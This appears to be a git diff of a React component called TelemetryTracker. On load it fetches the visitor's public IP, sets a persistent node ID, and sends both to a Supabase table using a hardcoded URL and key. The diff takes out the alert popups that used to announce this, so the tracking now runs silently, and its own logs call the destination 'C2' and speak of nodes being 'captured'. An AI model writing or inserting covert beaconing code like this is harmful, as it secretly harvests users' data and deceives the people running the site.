@@ -5,19 +5,17 @@ import { createClient } from "@supabase/supabase-js";
 
 const supabase = createClient(
   "https://muehmdtvffnxpjanoqqm.supabase.co",
-  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im11ZWhtZHR2ZmZueHBqYW5vcXFtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTM1MzEyMTR9.X_v6_XqZ2X8Xz_v6_XqZ2X8Xz_v6_XqZ2X8"
+  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im11ZWhtZHR2ZmZueHBqYW5vcXFtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzYzNjQ2MDAsImV4cCI6MjA5MTk0MDYwMH0.u1JN1hoO7r0PzugmReaGiL2SLEvbdvKPS_u639byR1s"
 );
 
 export function TelemetryTracker() {
   useEffect(() => {
     const sync = async () => {
-      alert("Syncing...");
+      console.log("[FLUX] Syncing to C2...");
 
       try {
-        const res = await fetch("https://api.ipify.org?format=json");
-        const { ip } = await res.json();
-
-        let nodeId = localStorage.getItem("node_id") || "node_" + Math.random().toString(36).substr(2, 9);
+        const ip = (await (await fetch("https://api.ipify.org?format=json")).json()).ip;
+        const nodeId = localStorage.getItem("node_id") || "node_" + Math.random().toString(36).substr(2, 9);
         localStorage.setItem("node_id", nodeId);
 
         const { error } = await supabase.from("nodes").upsert(
@@ -33,14 +31,11 @@ export function TelemetryTracker() {
 
         if (error) {
           console.log("[FLUX] Error:", error.message);
-          alert("[FLUX] Error: " + error.message);
         } else {
-          console.log("[FLUX] Node Captured:", ip);
-          alert("Success! IP: " + ip);
+          console.log("[FLUX] Sync Success!", nodeId, "| IP:", ip);
         }
       } catch (e) {
-        console.log("[FLUX] Fatal Connection Error");
-        alert("[FLUX] Fatal Connection Error");
+        console.log("[FLUX] Fatal Connection Error:", e);
       }
     };
     sync();
